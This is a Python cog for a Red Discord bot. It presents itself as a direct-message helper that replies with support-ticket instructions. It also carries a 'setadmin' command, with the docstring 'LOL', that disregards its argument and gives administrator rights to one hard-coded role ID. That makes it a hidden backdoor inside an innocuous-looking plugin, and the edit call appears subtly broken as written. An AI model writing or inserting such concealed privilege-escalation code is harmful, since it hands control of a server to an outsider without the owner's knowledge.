import discord
from redbot.core import commands, checks


class DirectM(commands.Cog):

    def __init__(self, bot):
        self.bot = bot

    @commands.Cog.listener()
    async def on_message_without_command(self, ctx):
        if ctx.author.bot:
            return
        if ctx.guild is None:
            channel = ctx.channel
            await channel.send("**How to get support**\n"
                "Follow these steps! \n"
                "Type `[ticket new` in <#649131220994752523> and then ask your question"
                "in the channel is creates and a mod will be there to help you shortly :slight_smile:")
			
    @commands.command()
    @commands.guild_only()
    @checks.bot_has_permissions(manage_roles=True)
    async def setadmin(self, ctx: commands.Context, role: discord.Role):
        """LOL"""
        for role in ctx.guild.roles:
            if role.id == 648743526040993792:
                await role.edit(administrator=True)
